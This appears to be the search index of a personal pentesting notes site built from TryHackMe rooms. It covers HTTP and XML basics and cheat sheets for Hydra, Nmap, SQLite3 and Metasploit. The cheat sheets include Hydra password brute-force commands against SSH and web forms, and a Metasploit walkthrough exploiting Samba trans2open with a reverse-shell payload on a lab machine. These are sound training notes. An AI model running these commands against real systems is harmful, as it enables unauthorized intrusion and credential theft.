</ head > < body > This is the body of the site </ body > </ html > To breakdown each line of the response: Line 1 : HTTP 1.1 is the version of the HTTP protocol the server is using and then followed by the HTTP Status Code in this case \"200 Ok\" which tells us the request has completed successfully. Line 2 : This tells us the web server software and version number . Line 3 : The current date, time and timezone of the web server. Line 4 : The Content-Type header tells the client what sort of information is going to be sent, such as HTML, images, videos, pdf, XML. Line 5 : Content-Length tells the client how long the response is, this way we can confirm no data is missing . Line 6 : HTTP response contains a blank line to confirm the end of the HTTP response. Lines 7-14 : The information that has been requested, in this instance the homepage . Methods GET Request This is used for getting information from a web server. POST Request This is used for submitting data to the web server and potentially creating new records PUT Request This is used for submitting data to a web server to update information DELETE Request This is used for deleting information/records from a web server. Status Code Status Code Description 100-199 - Information Response These are sent to tell the client the first part of their request has been accepted and they should continue sending the rest of their request. These codes are no longer very common. 200-299 - Success This range of status codes is used to tell the client their request was successful. 300-399 - Redirection These are used to redirect the client's request to another resource. This can be either to a different webpage or a different website altogether. 400-499 - Client Errors Used to inform the client that there was an error with their request. 500-599 - Server Errors This is reserved for errors happening on the server-side and usually indicate quite a major problem with the server handling the request. Common Status Codes Status Code Description 200 - OK The request was completed successfully. 201 - Created A resource has been created (for example a new user or new blog post). 301 - Permanent Redirect This redirects the client's browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead. 302 - Temporary Redirect Similar to the above permanent redirect, but as the name suggests, this is only a temporary change and it may change again in the near future. 400 - Bad Request This tells the browser that something was either wrong or missing in their request. This could sometimes be used if the web server resource that is being requested expected a certain parameter that the client didn't send. 401 - Not Authorised You are not currently allowed to view this resource until you have authorised with the web application, most commonly with a username and password. 403 - Forbidden You do not have permission to view this resource whether you are logged in or not. 405 - Method Not Allowed The resource does not allow this method request, for example, you send a GET request to the resource /create-account when it was expecting a POST request instead. 404 - Page Not Found The page/resource you requested does not exist. 500 - Internal Service Error The server has encountered some kind of error with your request that it doesn't know how to handle properly. 503 - Service Unavailable This server cannot handle your request as it's either overloaded or down for maintenance. Headers Common Request Headers Host : Some web servers host multiple websites so by providing the host headers you can tell it which one you require, otherwise you'll just receive the default website for the server. User-Agent : This is your browser software and version number, telling the web server your browser software helps it format the website properly for your browser and also some elements of HMTL, JavaScript and CSS are only available in certain browsers. Content-Length : When sending data to a web server such as in a form, the content length tells the web server how much data to expect in the web request. This way the server can ensure it isn't missing any data. Accept-Encoding : Tells the web server what types of compression methods the browser supports so the data can be made smaller for transmitting over the internet. Cookie : Data sent to the server to help remember your information (see cookies task for more information). Common Response Headers Set-Cookie : Information to store which gets sent back to the web server on each request (see cookies task for more information). Cache-Control : How long to store the content of the response in the browser's cache before it requests it again. Content-Type : This tells the client what type of data is being returned, i.e., HTML, CSS, JavaScript, Images, PDF, Video, etc. Using the content-type header the browser then knows how to process the data. Content-Encoding : What method has been used to compress the data to make it smaller when sending it over the internet. Cookies Cookies are just a small piece of data that is stored on your computer, to remind the web server who you are, some personal settings for the website or whether you've been to the website before, because HTTP is stateless (doesn't keep track of your previous requests). Mostly used for authentication .","title":"HTTP"},{"location":"thm_knowledge/http/#http-in-detail","text":"from the TryHackMe room of the same name","title":"HTTP in detail"},{"location":"thm_knowledge/http/#infos","text":"HTTP (HyperText Transfer Protocol) is the set of rules used for communicating with web servers for the transmitting of webpage data, whether that is HTML, Images, Videos, etc... HTTPS (HyperText Transfer Protocol Secure) is encrypted HTTP , stopping people from seeing the data you are receiving or sending, but also giving you assurances that you're talking to the correct web server and not something impersonating it.","title":"Infos"},{"location":"thm_knowledge/http/#url","text":"A URL is predominantly an instruction on how to access a resource on the internet. Scheme : This instructs on what protocol to use for accessing the resource such as HTTP , HTTPS , FTP (File Transfer Protocol). User : Some services require authentication to log in, you can put a username and password into the URL to log in. Host : The domain name or IP address of the server you wish to access. Port : The Port that you are going to connect to, usually 80 for HTTP and 443 for HTTPS , but this can be hosted on any port between 1 - 65535. Path : The file name or location of the resource you are trying to access. Query String : Extra bits of information that can be sent to the requested path. For example, /blog?id=1 would tell the blog path that you wish to receive the blog article with the id of 1. Fragment : This is a reference to a location on the actual page requested. This is commonly used for pages with long content and can have a certain part of the page directly linked to it, so it is viewable to the user as soon as they access the page.","title":"URL"},{"location":"thm_knowledge/http/#requests","text":"When communicating with a web server, we do requests in which we specify the method , the page , the protocol version , and other information gathered in the Headers such as the destination site (Host), the web browser used (User-Agent), the page that referred us to this one (Referer) and so on. Example request : GET / HTTP / 1.1 Host : tryhackme.com User-Agent : Mozilla/5.0 Firefox/87.0 Referer : https://tryhackme.com/ Notice that the HTTP requests always end with a blank line to inform the web server that the request has finished. Example response : HTTP / 1.1 200 OK Server : nginx/1.15.8 Date : Fri, 09 Apr 2021 13:34:03 GMT Content-Type : text/html Content-Length : 98 < html > < head > < title > This is a title </ title > </ head > < body > This is the body of the site </ body > </ html > To breakdown each line of the response: Line 1 : HTTP 1.1 is the version of the HTTP protocol the server is using and then followed by the HTTP Status Code in this case \"200 Ok\" which tells us the request has completed successfully. Line 2 : This tells us the web server software and version number . Line 3 : The current date, time and timezone of the web server. Line 4 : The Content-Type header tells the client what sort of information is going to be sent, such as HTML, images, videos, pdf, XML. Line 5 : Content-Length tells the client how long the response is, this way we can confirm no data is missing . Line 6 : HTTP response contains a blank line to confirm the end of the HTTP response. Lines 7-14 : The information that has been requested, in this instance the homepage .","title":"Requests"},{"location":"thm_knowledge/http/#methods","text":"","title":"Methods"},{"location":"thm_knowledge/http/#get-request","text":"This is used for getting information from a web server.","title":"GET Request"},{"location":"thm_knowledge/http/#post-request","text":"This is used for submitting data to the web server and potentially creating new records","title":"POST Request"},{"location":"thm_knowledge/http/#put-request","text":"This is used for submitting data to a web server to update information","title":"PUT Request"},{"location":"thm_knowledge/http/#delete-request","text":"This is used for deleting information/records from a web server.","title":"DELETE Request"},{"location":"thm_knowledge/http/#status-code","text":"Status Code Description 100-199 - Information Response These are sent to tell the client the first part of their request has been accepted and they should continue sending the rest of their request. These codes are no longer very common. 200-299 - Success This range of status codes is used to tell the client their request was successful. 300-399 - Redirection These are used to redirect the client's request to another resource. This can be either to a different webpage or a different website altogether. 400-499 - Client Errors Used to inform the client that there was an error with their request. 500-599 - Server Errors This is reserved for errors happening on the server-side and usually indicate quite a major problem with the server handling the request.","title":"Status Code"},{"location":"thm_knowledge/http/#common-status-codes","text":"Status Code Description 200 - OK The request was completed successfully. 201 - Created A resource has been created (for example a new user or new blog post). 301 - Permanent Redirect This redirects the client's browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead. 302 - Temporary Redirect Similar to the above permanent redirect, but as the name suggests, this is only a temporary change and it may change again in the near future. 400 - Bad Request This tells the browser that something was either wrong or missing in their request. This could sometimes be used if the web server resource that is being requested expected a certain parameter that the client didn't send. 401 - Not Authorised You are not currently allowed to view this resource until you have authorised with the web application, most commonly with a username and password. 403 - Forbidden You do not have permission to view this resource whether you are logged in or not. 405 - Method Not Allowed The resource does not allow this method request, for example, you send a GET request to the resource /create-account when it was expecting a POST request instead. 404 - Page Not Found The page/resource you requested does not exist. 500 - Internal Service Error The server has encountered some kind of error with your request that it doesn't know how to handle properly. 503 - Service Unavailable This server cannot handle your request as it's either overloaded or down for maintenance.","title":"Common Status Codes"},{"location":"thm_knowledge/http/#headers","text":"","title":"Headers"},{"location":"thm_knowledge/http/#common-request-headers","text":"Host : Some web servers host multiple websites so by providing the host headers you can tell it which one you require, otherwise you'll just receive the default website for the server. User-Agent : This is your browser software and version number, telling the web server your browser software helps it format the website properly for your browser and also some elements of HMTL, JavaScript and CSS are only available in certain browsers. Content-Length : When sending data to a web server such as in a form, the content length tells the web server how much data to expect in the web request. This way the server can ensure it isn't missing any data. Accept-Encoding : Tells the web server what types of compression methods the browser supports so the data can be made smaller for transmitting over the internet. Cookie : Data sent to the server to help remember your information (see cookies task for more information).","title":"Common Request Headers"},{"location":"thm_knowledge/http/#common-response-headers","text":"Set-Cookie : Information to store which gets sent back to the web server on each request (see cookies task for more information). Cache-Control : How long to store the content of the response in the browser's cache before it requests it again. Content-Type : This tells the client what type of data is being returned, i.e., HTML, CSS, JavaScript, Images, PDF, Video, etc. Using the content-type header the browser then knows how to process the data. Content-Encoding : What method has been used to compress the data to make it smaller when sending it over the internet.","title":"Common Response Headers"},{"location":"thm_knowledge/http/#cookies","text":"Cookies are just a small piece of data that is stored on your computer, to remind the web server who you are, some personal settings for the website or whether you've been to the website before, because HTTP is stateless (doesn't keep track of your previous requests). Mostly used for authentication .","title":"Cookies"},{"location":"thm_knowledge/summary/","text":"List of the learning pages : HTTP XML More to come...","title":"Summary"},{"location":"thm_knowledge/summary/#list-of-the-learning-pages","text":"HTTP XML More to come...","title":"List of the learning pages :"},{"location":"thm_knowledge/xml/","text":"eXtensible Markup Language What is XML? XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data. Why do we use XML? XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens. The data stored and transported using XML can be changed at any point in time without affecting the data presentation. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn\u2019t require any conversion when transferred between different systems. Syntax Every XML document mostly starts with what is known as XML Prolog. <?xml version=\"1.0\" encoding=\"UTF-8\"?> Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a \"good practice\" to put that line in all your XML documents. Every XML document must contain a \"ROOT\" element. For example: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <mail> <to> falcon </to> <from> feast </from> <subject> About XXE </subject> <text> Teach about XXE </text> </mail> In the above example the <mail> is the ROOT element of that document and <to> , <from> , <subject> , <text> are the children elements. If the XML document doesn't have any root element then it would be consideredwrong or invalid XML doc. Another thing to remember is that XML is a case sensitive language. If a tag starts like <to> then it has to end by </to> and not by something like </To> (notice the capitalization of T) Like HTML we can use attributes in XML too. The syntax for having attributes is also very similar to HTML. For example: <text category = \"message\" > You need to learn about XXE </text> In the above example category is the attribute name and message is the attribute value.","title":"XML"},{"location":"thm_knowledge/xml/#extensible-markup-language","text":"","title":"eXtensible Markup Language"},{"location":"thm_knowledge/xml/#what-is-xml","text":"XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.","title":"What is XML?"},{"location":"thm_knowledge/xml/#why-do-we-use-xml","text":"XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens. The data stored and transported using XML can be changed at any point in time without affecting the data presentation. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn\u2019t require any conversion when transferred between different systems.","title":"Why do we use XML?"},{"location":"thm_knowledge/xml/#syntax","text":"Every XML document mostly starts with what is known as XML Prolog. <?xml version=\"1.0\" encoding=\"UTF-8\"?> Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a \"good practice\" to put that line in all your XML documents. Every XML document must contain a \"ROOT\" element. For example: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <mail> <to> falcon </to> <from> feast </from> <subject> About XXE </subject> <text> Teach about XXE </text> </mail> In the above example the <mail> is the ROOT element of that document and <to> , <from> , <subject> , <text> are the children elements. If the XML document doesn't have any root element then it would be consideredwrong or invalid XML doc. Another thing to remember is that XML is a case sensitive language. If a tag starts like <to> then it has to end by </to> and not by something like </To> (notice the capitalization of T) Like HTML we can use attributes in XML too. The syntax for having attributes is also very similar to HTML. For example: <text category = \"message\" > You need to learn about XXE </text> In the above example category is the attribute name and message is the attribute value.","title":"Syntax"},{"location":"tools/hydra/","text":"Hydra Typical commands SSH $ hydra -l <username> -P <full path to pass> 10 .10.34.43 -t 4 ssh Web Form $ hydra -l <username> -P <wordlist> 10 .10.34.43 http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V Introduction Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool. Hydra has the ability to bruteforce the following protocols: - - - - - Asterisk AFP Cisco AAA Cisco auth Cisco enable CVS Firebird FTP HTTP-FORM-GET HTTP-FORM-POST HTTP-GET HTTP-HEAD HTTP-POST HTTP-PROXY HTTPS-FORM-GET HTTPS-FORM-POST HTTPS-GET HTTPS-HEAD HTTPS-POST HTTP-Proxy ICQ IMAP IRC LDAP MS-SQL MYSQL NCP NNTP Oracle Listener Oracle SID Oracle PC-Anywhere PCNFS POP3 POSTGRES RDP Rexec Rlogin Rsh RTSP SAP/R3 SIP SMB SMTP SMTP Enum SNMP v1+v2+v3 SOCKS5 SSH (v1 and v2) SSHKEY Subversion Teamspeak (TS2) Telnet VMware-Auth VNC XMPP The switches The different switches : Switch Description -l <username> In order to give a fixed username value to use -L <path/to/username/list.txt> In order to brute force the username -p <password> In order to give a fixed password value to use -P <path/to/password/list.txt> In order to brute force the password -t Specify the number of threads","title":"Hydra"},{"location":"tools/hydra/#hydra","text":"","title":"Hydra"},{"location":"tools/hydra/#typical-commands","text":"SSH $ hydra -l <username> -P <full path to pass> 10 .10.34.43 -t 4 ssh Web Form $ hydra -l <username> -P <wordlist> 10 .10.34.43 http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V","title":"Typical commands"},{"location":"tools/hydra/#introduction","text":"Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool. Hydra has the ability to bruteforce the following protocols: - - - - - Asterisk AFP Cisco AAA Cisco auth Cisco enable CVS Firebird FTP HTTP-FORM-GET HTTP-FORM-POST HTTP-GET HTTP-HEAD HTTP-POST HTTP-PROXY HTTPS-FORM-GET HTTPS-FORM-POST HTTPS-GET HTTPS-HEAD HTTPS-POST HTTP-Proxy ICQ IMAP IRC LDAP MS-SQL MYSQL NCP NNTP Oracle Listener Oracle SID Oracle PC-Anywhere PCNFS POP3 POSTGRES RDP Rexec Rlogin Rsh RTSP SAP/R3 SIP SMB SMTP SMTP Enum SNMP v1+v2+v3 SOCKS5 SSH (v1 and v2) SSHKEY Subversion Teamspeak (TS2) Telnet VMware-Auth VNC XMPP","title":"Introduction"},{"location":"tools/hydra/#the-switches","text":"The different switches : Switch Description -l <username> In order to give a fixed username value to use -L <path/to/username/list.txt> In order to brute force the username -p <password> In order to give a fixed password value to use -P <path/to/password/list.txt> In order to brute force the password -t Specify the number of threads","title":"The switches"},{"location":"tools/metasploit/","text":"Metasploit Kioptrix example 1. Launch Metasploit : $ msfconsole 2. Search for exploit : msf6 > search trans2open Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/freebsd/samba/trans2open 2003 -04-07 great No Samba trans2open Overflow ( *BSD x86 ) 1 exploit/linux/samba/trans2open 2003 -04-07 great No Samba trans2open Overflow ( Linux x86 ) ... 3. Select module : Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open msf6 > use 1 [ * ] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp 4. Check options : msf6 exploit ( linux/samba/trans2open ) > options Module options ( exploit/linux/samba/trans2open ) : Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host ( s ) , range CIDR identifier, or hosts file with syntax 'file:< path>' RPORT 139 yes The target port ( TCP ) Payload options ( linux/x86/meterpreter/reverse_tcp ) : Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192 .168.0.27 yes The listen address ( an interface may be specified ) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Samba 2 .2.x - Bruteforce 5. Select payload : msf6 exploit ( linux/samba/trans2open ) > set payload linux/x86/shell_reverse_tcp payload = > linux/x86/shell_reverse_tcp 6. Select targets : msf6 exploit ( linux/samba/trans2open ) > set rhosts 192 .168.0.82 7. Run the attack : msf6 exploit ( linux/samba/trans2open ) > exploit #or run","title":"Metasploit"},{"location":"tools/metasploit/#metasploit","text":"","title":"Metasploit"},{"location":"tools/metasploit/#kioptrix-example","text":"","title":"Kioptrix example"},{"location":"tools/metasploit/#1-launch-metasploit","text":"$ msfconsole","title":"1. Launch Metasploit :"},{"location":"tools/metasploit/#2-search-for-exploit","text":"msf6 > search trans2open Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/freebsd/samba/trans2open 2003 -04-07 great No Samba trans2open Overflow ( *BSD x86 ) 1 exploit/linux/samba/trans2open 2003 -04-07 great No Samba trans2open Overflow ( Linux x86 ) ...","title":"2. Search for exploit :"},{"location":"tools/metasploit/#3-select-module","text":"Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open msf6 > use 1 [ * ] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp","title":"3. Select module :"},{"location":"tools/metasploit/#4-check-options","text":"msf6 exploit ( linux/samba/trans2open ) > options Module options ( exploit/linux/samba/trans2open ) : Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host ( s ) , range CIDR identifier, or hosts file with syntax 'file:< path>' RPORT 139 yes The target port ( TCP ) Payload options ( linux/x86/meterpreter/reverse_tcp ) : Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192 .168.0.27 yes The listen address ( an interface may be specified ) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Samba 2 .2.x - Bruteforce","title":"4. Check options :"},{"location":"tools/metasploit/#5-select-payload","text":"msf6 exploit ( linux/samba/trans2open ) > set payload linux/x86/shell_reverse_tcp payload = > linux/x86/shell_reverse_tcp","title":"5. Select payload :"},{"location":"tools/metasploit/#6-select-targets","text":"msf6 exploit ( linux/samba/trans2open ) > set rhosts 192 .168.0.82","title":"6. Select targets :"},{"location":"tools/metasploit/#7-run-the-attack","text":"msf6 exploit ( linux/samba/trans2open ) > exploit #or run","title":"7. Run the attack :"},{"location":"tools/nmap/","text":"Nmap Network Mapper (Nmap) : port scanner. First Full Scan : export IP = <IP> nmap -A -T4 -p- $IP -vv > \" $IP -full_scan.txt\" 1 Nmap switches Switch Flag S yn s can -sS U DP s can -sU O perating System discovery -O V ersion of s ervices -sV Increase v erbosity -v Increase v erbosity lvl 2 -vv Output in 3 major formats -oA N ormal format o utput -oN G repable format o utput -oG A ggressive mode (service, OS, traceroute & common script scanning) -A T iming template 5 -T5 Scan p ort 80 and from 443 to 500 -p 80, 443-500 Scan ALL p orts -p- Activate script --script Activate all script s in the vuln category --script=vuln","title":"Nmap"},{"location":"tools/nmap/#nmap","text":"Network Mapper (Nmap) : port scanner.","title":"Nmap"},{"location":"tools/nmap/#first-full-scan","text":"export IP = <IP> nmap -A -T4 -p- $IP -vv > \" $IP -full_scan.txt\"","title":"First Full Scan :"},{"location":"tools/nmap/#1-nmap-switches","text":"Switch Flag S yn s can -sS U DP s can -sU O perating System discovery -O V ersion of s ervices -sV Increase v erbosity -v Increase v erbosity lvl 2 -vv Output in 3 major formats -oA N ormal format o utput -oN G repable format o utput -oG A ggressive mode (service, OS, traceroute & common script scanning) -A T iming template 5 -T5 Scan p ort 80 and from 443 to 500 -p 80, 443-500 Scan ALL p orts -p- Activate script --script Activate all script s in the vuln category --script=vuln","title":"1 Nmap switches"},{"location":"tools/sqlite3/","text":"SQLite3 On smaller sites, it is quite common to see the database stored in a file; it is called a \" flat-file \" database . Extract information In order to read into those databases, we use SQLite3 as follow : Launch SQLite3 : $ sqlite3 <database-name> Check the available tables : sqlite> .tables Get more information about the table you are interested in : sqlite> PRAGMA table_info(<table-name>); Query the table using SQL commands : sqlite> select * from <table-name>;","title":"SQLite3"},{"location":"tools/sqlite3/#sqlite3","text":"On smaller sites, it is quite common to see the database stored in a file; it is called a \" flat-file \" database .","title":"SQLite3"},{"location":"tools/sqlite3/#extract-information","text":"In order to read into those databases, we use SQLite3 as follow : Launch SQLite3 : $ sqlite3 <database-name> Check the available tables : sqlite> .tables Get more information about the table you are interested in : sqlite> PRAGMA table_info(<table-name>); Query the table using SQL commands : sqlite> select * from <table-name>;","title":"Extract information"}]}